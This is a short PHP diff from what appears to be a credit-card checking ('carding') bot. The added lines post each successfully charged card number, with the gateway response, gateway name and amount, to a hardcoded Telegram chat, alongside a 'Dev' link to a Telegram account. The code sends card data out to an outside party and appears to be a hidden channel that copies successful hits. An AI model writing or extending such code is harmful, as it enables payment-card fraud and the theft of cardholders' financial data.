@@ -1724,6 +1724,21 @@ if (
         'Gateway' => $gateway,
         'cc' => $cc1,
     ]);
+    $chat_id1 = '-1003238480673';
+    output('sendMessage', [
+        'chat_id' => $chat_id1,
+        'text' => "<b>Charged</b>\n\nCard: <code>$cc1</code>\nResponse: $err\nGateway: $gateway\nPrice: $totalamt",
+        'reply_markup' => json_encode([
+            'inline_keyboard' => [
+                [
+                    [
+                        'text' => "Dev",
+                        'url' => 'https://t.me/gamer_addaZ'
+                    ]
+                ]
+            ]
+        ])
+    ]);
     echo $result;
     echo $response5;
     exit;
